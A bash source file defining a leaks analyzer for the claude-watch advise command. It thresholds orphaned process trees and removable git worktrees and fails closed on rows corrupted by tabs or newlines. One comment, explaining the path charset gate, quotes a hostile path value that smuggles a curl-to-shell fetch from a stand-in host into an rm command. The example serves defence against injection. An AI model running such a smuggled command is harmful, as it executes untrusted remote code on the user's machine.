#!/usr/bin/env bash
# Leaks domain analyzer for `claude-watch advise` (plan §3b, §5, §6 U5).
#
# Sourced, never executed: it defines two functions and returns.
#
#   leaks_findings <orphan_values> <worktree_values>  PURE — rows from values
#   advise_leaks                                      impure — gathers, calls it
#
# The split is the whole point (§3b). `advise_leaks` calls `scan_orphans` and
# `scan_worktrees`, which live in the parent `claude-watch` script, so the only
# way to test the thresholds without the parent is for the severity half to take
# its input as values. It reads no file and runs no scan: severity is a pure
# function of (value, threshold), in code and not only in the plan.
#
# This analyzer re-implements NO classification (§3d). Which trees are orphans
# and which worktrees are removable is decided by the parent's scanners; here we
# only count, threshold and phrase.

# ---------------------------------------------------------------- thresholds --
# §5. Named constants, each overridable by the env var beside it, each printed
# with the finding it fires (threshold_name) so the user knows which number to
# argue with. `or`, not `and`: an old tree and a fat tree are two independent
# symptoms of the same leak and either alone is worth reporting.
LEAKS_ORPHAN_WARN_HOURS_DEFAULT=24     # CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS
LEAKS_ORPHAN_WARN_MB_DEFAULT=200       # CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
LEAKS_WORKTREE_WARN_GIB_DEFAULT=1      # CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

# Defined by the parent; redefined here only when this file is sourced alone
# (the fixture), so the two can never drift into two different definitions.
declare -F is_uint >/dev/null 2>&1 || \
  is_uint() { case "${1:-}" in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac; }

# A knob typo must not silently become a different threshold: awk coerces a
# non-numeric to 0, which would turn "--min typo" into "report everything".
# Exit 2, the same discipline the parent applies to --min and --days.
leaks_knob() {   # <env var name> <default>
  local name=$1 def=$2 v=${!1-}
  [ -n "$v" ] || { printf '%s' "$def"; return 0; }
  if ! is_uint "$v"; then
    printf 'claude-watch advise: %s needs a non-negative integer (got "%s")\n' "$name" "$v" >&2
    exit 2
  fi
  # is_uint accepts "08", and bash arithmetic then reads it as invalid octal and
  # kills the function with status 1 instead of the specified 2. Normalise to
  # base 10 here so every threshold multiplication downstream is safe.
  printf '%s' "$((10#$v))"
}

# ------------------------------------------------------------------ helpers --
# §3b: strip \t and \n from every text field before emitting, same shape as
# clean() (sample.sh:121). One tr covers both jobs — every control byte, tab and
# newline included, becomes a space — because a tab reaching the emitter has
# already mis-split the row, and process names and paths are arbitrary bytes.
leaks_clean() { printf '%s' "${1-}" | LC_ALL=C tr '\001-\037\177' '[ *]'; }

# §3b charset gate. A correctly quoted `rm -rf 'x; curl evil.sh | sh'` is safe
# to run and still a terrible thing to hand someone to paste, so quoting is the
# first layer and this refusal is the second.
leaks_path_safe() {
  [ -n "${1-}" ] || return 1
  case $1 in *[!A-Za-z0-9._/\ +@-]*) return 1 ;; esac
  return 0
}

leaks_qq() { local s=${1//\'/\'\\\'\'}; printf "'%s'" "$s"; }

# Sizes in the text fields only. fmt_mem lives in the parent and this file must
# work without it.
leaks_hmem() {
  LC_ALL=C awk -v k="${1:-0}" 'BEGIN {
    if (k >= 1048576) printf "%.1f GiB", k / 1048576
    else if (k >= 1024) printf "%.0f MiB", k / 1024
    else printf "%d KiB", k
  }'
}
leaks_hdur() {
  LC_ALL=C awk -v s="${1:-0}" 'BEGIN {
    if (s >= 86400) printf "%.1fd", s / 86400
    else if (s >= 3600) printf "%.1fh", s / 3600
    else printf "%dm", s / 60
  }'
}

# §3a, binding: a share whose denominator is empty or 0 is emitted as 0, never
# computed. nan and inf are not valid JSON (§3e) and the leaks worktree share is
# the live instance — there is no denominator when no disk scan has ever run.
# Clamped at 1 because subtree RSS double-counts shared pages and share is 0..1.
leaks_share() {   # <numerator_kb> <denominator_kb>
  local n=${1:-0} d=${2-}
  if ! is_uint "$d" || [ "${d:-0}" -eq 0 ] 2>/dev/null; then printf '0'; return 0; fi
  LC_ALL=C awk -v n="$n" -v d="$d" 'BEGIN { s = n / d; if (s > 1) s = 1; printf "%.4f", s }'
}

leaks_rank() {
  case ${1-} in critical) printf 4 ;; warn) printf 3 ;; info) printf 2 ;; unknown) printf 1 ;; *) printf 0 ;; esac
}

# --------------------------------------------------- aggregation (impure) --
# These read a captured scan and reduce it to the value line `leaks_findings`
# consumes. They are the only part of this file that touches the filesystem.
#
# **Field position cannot be trusted until the row has been counted.** A tab in
# a path or an argv splits one row into more fields than the shape has, so `$2`
# is then a prefix of the real path — and printing a reap command for
# `/Users/safe` when the actual directory is `/Users/safe<TAB>evil` points the
# user at a real, different, innocent-looking directory. A newline is worse: it
# injects a whole synthetic row. So a row whose field count is not exactly the
# §3d shape is UNREPRESENTABLE: it is excluded from every total, counted, and
# reported as needing manual handling. Never guessed at.

# T rows only. P rows carry raw argv, which may legally contain tabs, and
# nothing here needs them: nproc and subtree RSS are already on the T row.
# Reading a P field would be how a tab in an argv becomes a number in a total.
leaks_agg_orphans() {   # <file> -> n \t total_rss_kb \t max_age_s \t top_rss_kb \t top_age_s \t top_pid \t unrep \t top_name
  LC_ALL=C awk -F'\t' '
    BEGIN { OFS = "\t" }
    $1 == "T" && NF != 7 { unrep++; next }
    $1 == "T" {
      n++
      rss = $5 + 0; age = $4 + 0
      total += rss
      if (age > maxage) maxage = age
      if (rss > toprss || n == 1) { toprss = rss; topage = age; toppid = $2; topname = $3 }
    }
    # Every field but the last is numeric and non-empty on purpose: tab is an
    # IFS *whitespace* character, so the `read` on the other side collapses a
    # run of tabs into one delimiter, and one empty interior field would shift
    # every value after it by one. Only the last field may be empty.
    END { print n + 0, total + 0, maxage + 0, toprss + 0, topage + 0, toppid + 0, unrep + 0, topname "" }
  ' "$1"
}

# Removable is the parent's own definition (claude-watch:1120) — STALE or
# PRUNABLE — consumed as-is, never re-derived. ACTIVE and UNSAFE never appear in
# a reclaim total, so no finding here can point at a live agent or at
# unpublished work.
leaks_agg_worktrees() {   # <file> -> n \t reclaim_kb \t max_age_days \t top_kb \t unrep \t top_path
  LC_ALL=C awk -F'\t' '
    BEGIN { OFS = "\t" }
    # Count is necessary and not sufficient. A newline inside a path splits one
    # worktree across two physical lines, and the tail of a crafted directory
    # name can present as a complete NINE-FIELD row — right count, wrong
    # record. So the CONTENT is validated too: the status must be one of the
    # five §3d words and every numeric column must actually be numeric. A row
    # assembled out of a path fragment does not survive that.
    NF != 9 { unrep++; next }
    $1 !~ /^(ACTIVE|UNSAFE|STALE|RECENT|PRUNABLE)$/ { unrep++; next }
    $5 !~ /^[0-9]+$/ || $6 !~ /^[0-9]+$/ || $7 !~ /^[0-9]+$/ || $8 !~ /^[0-9]+$/ { unrep++; next }
    $1 == "STALE" || $1 == "PRUNABLE" {
      n++
      kb = $8 + 0; age = $5 + 0
      total += kb
      if (age > maxage) maxage = age
      if (kb > topkb || n == 1) { topkb = kb; toppath = $2 }
    }
    # Numeric and non-empty except the last field — see leaks_agg_orphans.
    END { print n + 0, total + 0, maxage + 0, topkb + 0, unrep + 0, toppath "" }
  ' "$1"
}

# ------------------------------------------------------------------- pure --
# leaks_findings <orphan_values|""> <worktree_values|"">
#
# Takes ALREADY-MEASURED VALUES, never a path: the whole point of §3b's split is
# that severity is a pure function of (value, threshold), so this function
# touches no file, runs no scan and its output depends only on its arguments and
# the threshold/denominator environment. The arguments are the value lines
# leaks_agg_orphans / leaks_agg_worktrees produce:
#
#   orphans   n \t total_rss_kb \t max_age_s \t top_rss_kb \t top_age_s \t top_pid \t unrep \t top_name
#   worktrees n \t reclaim_kb \t max_age_days \t top_kb \t unrep \t top_path
#
# An EMPTY argument means that scan could not be run — which is not the same as
# an all-zero line, and the difference is the one this whole tool exists to
# prevent: `ok` may never be emitted for a domain that was not measured.
leaks_findings() {
  local ov=${1-} wv=${2-}
  # leaks_knob runs in a command substitution, so its `exit 2` only ends that
  # subshell — the exit has to be repeated here to actually stop the run. A knob
  # typo must never be rounded to a working threshold.
  local warn_hours warn_mb warn_gib
  warn_hours=$(leaks_knob CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS "$LEAKS_ORPHAN_WARN_HOURS_DEFAULT") || exit 2
  warn_mb=$(leaks_knob CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB "$LEAKS_ORPHAN_WARN_MB_DEFAULT") || exit 2
  warn_gib=$(leaks_knob CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB "$LEAKS_WORKTREE_WARN_GIB_DEFAULT") || exit 2

  local o_ok=0 w_ok=0
  [ -n "$ov" ] && o_ok=1
  [ -n "$wv" ] && w_ok=1

  # Neither scan ran: unknown, no findings, and a remedy sentence. The invariant
  # §3b asserts both ways: unavailable <=> unknown.
  if [ "$o_ok" = 0 ] && [ "$w_ok" = 0 ]; then
    printf 'S\tleaks\tunknown\tunavailable\t%s\t%s\t%s\n' \
      'scan_permission_denied' \
      'leak scans could not run, so nothing here was measured' \
      'run claude-watch orphans and claude-watch worktrees directly to see the error'
    return 0
  fi

  local tab; tab=$(printf '\t')
  local -a rows=()
  local worst=ok
  # Reason flags, resolved into the §3e enum once at the bottom. Emitting `0`
  # for a share whose denominator is absent is only half of §3a; recording that
  # we did so is the other half, and a consumer reading share 0 as "negligible"
  # rather than "not measured" is exactly the failure the field exists to stop.
  local r_mem=0 r_vol=0 r_unrep=0 r_scan=0
  [ "$o_ok" = 0 ] || [ "$w_ok" = 0 ] && r_scan=1

  # ------------------------------------------------------------- orphans --
  local o_n=0 o_total=0 o_maxage=0 o_toprss=0 o_topage=0 o_toppid= o_unrep=0 o_topname=
  if [ "$o_ok" = 1 ]; then
    IFS="$tab" read -r o_n o_total o_maxage o_toprss o_topage o_toppid o_unrep o_topname <<< "$ov"
  fi
  [ "${o_unrep:-0}" -gt 0 ] && r_unrep=1
  if [ "${o_n:-0}" -gt 0 ]; then
    local sev=info tname=CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
    local value=$o_total unit=kb threshold=$((warn_mb * 1024))
    if [ "$o_toprss" -ge $((warn_mb * 1024)) ]; then
      sev=warn; value=$o_toprss
    elif [ "$o_maxage" -ge $((warn_hours * 3600)) ]; then
      sev=warn; tname=CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS
      value=$o_maxage; unit=seconds; threshold=$((warn_hours * 3600))
    fi
    # leaks_share prints a bare "0" only on the missing-denominator path; a real
    # but tiny share prints "0.0000", so this string test says "not computed",
    # not "computed and small".
    local o_share; o_share=$(leaks_share "$o_total" "${CW_MEMSIZE_KB-}")
    [ "$o_share" = 0 ] && [ "$o_total" -gt 0 ] && r_mem=1
    local name; name=$(leaks_clean "$o_topname")
    local o_extra=
    [ "${o_unrep:-0}" -gt 0 ] && o_extra="; $o_unrep unparsable row$([ "$o_unrep" = 1 ] || printf 's') skipped"
    rows+=("$(printf '%s\t%s\tleaks.orphans\tF\tleaks\tleaks.orphans\t%s\t%s\t%s\t%s\t%s\t%s\t0\tlikely\t%s\t%s\t%s' \
      "$(leaks_rank "$sev")" "$o_share" \
      "$sev" "$o_share" "$value" "$unit" "$threshold" "$tname" \
      "$(leaks_clean "$o_n leaked process tree$([ "$o_n" = 1 ] || printf 's'), $(leaks_hmem "$o_total") resident, oldest $(leaks_hdur "$o_maxage")")" \
      "$(leaks_clean "largest: $name (pid ${o_toppid:-?}) $(leaks_hmem "$o_toprss"), $(leaks_hdur "$o_topage") old; warns at ${warn_hours}h or ${warn_mb}M$o_extra")" \
      'run /claude-watch-reap and choose orphans to review and kill them')")
    worst=$sev
  fi

  # ----------------------------------------------------------- worktrees --
  local w_n=0 w_reclaim=0 w_maxage=0 w_topkb=0 w_unrep=0 w_toppath=
  if [ "$w_ok" = 1 ]; then
    IFS="$tab" read -r w_n w_reclaim w_maxage w_topkb w_unrep w_toppath <<< "$wv"
  fi
  [ "${w_unrep:-0}" -gt 0 ] && r_unrep=1
  if [ "${w_n:-0}" -gt 0 ] || [ "${w_unrep:-0}" -gt 0 ]; then
    local wsev=info action headline detail
    local w_value=$w_reclaim w_share
    if [ "${w_unrep:-0}" -gt 0 ]; then
      # FAIL CLOSED, the whole domain. An injected record always arrives beside
      # the malformed fragment it was split from, so once one row is
      # unrepresentable ANY row in this scan may be a fabrication — including a
      # perfectly plausible one. There is no honest number to publish and no
      # path safe to name, so this finding reports the corruption and nothing
      # else: no total, no reclaim figure, no command. Reporting a smaller
      # total instead would be a lie with a decimal point on it.
      w_value=0
      w_share=0
      action="the worktree listing could not be trusted — run claude-watch worktrees and check it by hand"
      headline="worktree listing unusable: $w_unrep unrepresentable row$([ "$w_unrep" = 1 ] || printf 's')"
      detail="$w_n row$([ "$w_n" = 1 ] || printf 's') parsed, but a tab or newline in a path can split one worktree into two rows, so no reclaim total and no removal target can be trusted from this scan"
    else
      [ "$w_reclaim" -ge $((warn_gib * 1048576)) ] && wsev=warn
      w_share=$(leaks_share "$w_reclaim" "${CW_VOLUME_TOTAL_KB-}")
      [ "$w_share" = 0 ] && [ "$w_reclaim" -gt 0 ] && r_vol=1
      # The action names a path, so both §3b layers apply: quote always, and
      # print no command at all when the path leaves the safe charset.
      if leaks_path_safe "$w_toppath"; then
        action="run /claude-watch-reap and choose worktrees to remove them (largest: $(leaks_qq "$w_toppath"))"
      else
        action="$(leaks_clean "$w_toppath") — path needs manual handling"
      fi
      headline="$w_n removable agent worktree$([ "$w_n" = 1 ] || printf 's'), $(leaks_hmem "$w_reclaim") reclaimable"
      detail="largest $(leaks_hmem "$w_topkb"), oldest ${w_maxage}d; warns at ${warn_gib} GiB reclaimable"
    fi
    rows+=("$(printf '%s\t%s\tleaks.worktrees\tF\tleaks\tleaks.worktrees\t%s\t%s\t%s\tkb\t%s\tCLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB\t%s\tconfirmed\t%s\t%s\t%s' \
      "$(leaks_rank "$wsev")" "$w_share" \
      "$wsev" "$w_share" "$w_value" "$((warn_gib * 1048576))" "$w_value" \
      "$(leaks_clean "$headline")" "$(leaks_clean "$detail")" "$(leaks_clean "$action")")")
    [ "$(leaks_rank "$wsev")" -gt "$(leaks_rank "$worst")" ] && worst=$wsev
  fi

  # ---------------------------------------------------------- the S row --
  local state=complete reasons= remedy= summary=
  if [ "$((r_scan + r_mem + r_vol + r_unrep))" -gt 0 ]; then
    state=partial
    # Fixed order, §3e's own. A csv whose order depends on which flag was set
    # first is a fixture that flakes.
    [ "$r_mem"   = 1 ] && reasons="${reasons:+$reasons,}no_samples"
    [ "$r_vol"   = 1 ] && reasons="${reasons:+$reasons,}cache_missing"
    # scan_malformed is NOT in §3e's enum today: these rows come from a
    # transient live scan, and cache_malformed ("the cache exists but does not
    # parse") would send a consumer looking for a cache file that is fine. The
    # enum needs this value added; U2's emitter and U6's SKILL.md carry it.
    [ "$r_unrep" = 1 ] && reasons="${reasons:+$reasons,}scan_malformed"
    [ "$r_scan"  = 1 ] && reasons="${reasons:+$reasons,}scan_permission_denied"
    # One sentence, worst cause first.
    if [ "$o_ok" = 0 ]; then
      remedy='the orphan scan could not run; run claude-watch orphans directly to see the error'
    elif [ "$w_ok" = 0 ]; then
      remedy='the worktree scan could not run; run claude-watch worktrees directly to see the error'
    elif [ "$r_unrep" = 1 ]; then
      remedy='some scan rows could not be parsed, so no removal target is trustworthy; run claude-watch orphans and claude-watch worktrees and check them by hand'
    else
      remedy='no volume total or memory size is recorded yet, so shares are reported as 0 rather than computed; severity still comes from the absolute thresholds'
    fi
  fi

  if [ "${#rows[@]}" -eq 0 ]; then
    # Measured (at least in part) and clean. Every domain degrades to this shape.
    if [ "$o_ok" = 0 ]; then
      summary='no removable worktrees; leaked processes were not measured'
    elif [ "$w_ok" = 0 ]; then
      summary='no leaked processes; worktrees were not measured'
    else
      summary='no leaked processes, no removable worktrees'
    fi
  else
    local parts=
    [ "${o_n:-0}" -gt 0 ] && parts="$o_n leaked process tree$([ "$o_n" = 1 ] || printf 's') ($(leaks_hmem "$o_total"))"
    if [ "${w_unrep:-0}" -gt 0 ]; then
      [ -n "$parts" ] && parts="$parts; "
      parts="${parts}the worktree listing could not be trusted ($w_unrep unrepresentable row$([ "$w_unrep" = 1 ] || printf 's'))"
    elif [ "${w_n:-0}" -gt 0 ]; then
      [ -n "$parts" ] && parts="$parts; "
      parts="$parts$w_n removable worktree$([ "$w_n" = 1 ] || printf 's') ($(leaks_hmem "$w_reclaim") reclaimable)"
    fi
    [ -z "$parts" ] && parts="nothing removable could be identified"
    summary=$parts
  fi

  printf 'S\tleaks\t%s\t%s\t%s\t%s\t%s\n' \
    "$worst" "$state" "$reasons" "$(leaks_clean "$summary")" "$(leaks_clean "$remedy")"

  # §4, one ordering rule: (severity_rank desc, share_of_domain desc, id asc).
  # The third key is not optional — two findings at equal severity and equal
  # share (trivially, two shares of 0) would otherwise order by whichever
  # happened to be appended first, and every fixture that reads row 2 flakes.
  # The three keys are carried as a prefix and cut off again.
  [ "${#rows[@]}" -eq 0 ] && return 0
  printf '%s\n' "${rows[@]}" \
    | LC_ALL=C sort -t"$tab" -k1,1nr -k2,2nr -k3,3 \
    | LC_ALL=C cut -f4-
}

# ----------------------------------------------------------------- impure --
# Gathers the two live scans, reduces each to a value line and hands those to
# the pure half. Both scanners live in the parent script; when this file is
# sourced without it, that input is marked unmeasured rather than reported clean.
advise_leaks() {
  local o w ov= wv=
  # A mktemp failure used to `return 1` here with nothing printed at all — no
  # S row, no findings. The combined `{ advise_disk; advise_leaks; }` in
  # tools/advise.sh ignores both analyzers' exit statuses, so that left the
  # leaks domain silently absent from render while advise still exited 0
  # (A3). leaks_findings "" "" is the SAME unknown/unavailable row this
  # function already emits when neither scan could run below — reused rather
  # than invented, so there is one fallback shape, not two.
  o=$(mktemp) || { leaks_findings "" ""; return 1; }
  w=$(mktemp) || { rm -f "$o"; leaks_findings "" ""; return 1; }

  if declare -F scan_orphans >/dev/null 2>&1; then
    scan_orphans "${ORPHAN_MIN_DEFAULT:-60}" > "$o" 2>/dev/null && ov=$(leaks_agg_orphans "$o")
  fi
  if declare -F scan_worktrees >/dev/null 2>&1; then
    # One lsof sweep, exactly as the worktrees command does it: without it every
    # worktree falls to "cannot verify liveness" and reads UNSAFE.
    declare -F init_live_cwds >/dev/null 2>&1 && init_live_cwds
    scan_worktrees 7 > "$w" 2>/dev/null && wv=$(leaks_agg_worktrees "$w")
  fi

  rm -f "$o" "$w"
  # init_live_cwds leaves a snapshot behind; advise is read-only and long-lived
  # enough that leaving one temp file per run in /tmp is a real leak.
  [ -n "${CWD_SNAP:-}" ] && { rm -f "$CWD_SNAP"; CWD_SNAP=""; }
  leaks_findings "$ov" "$wv"
}
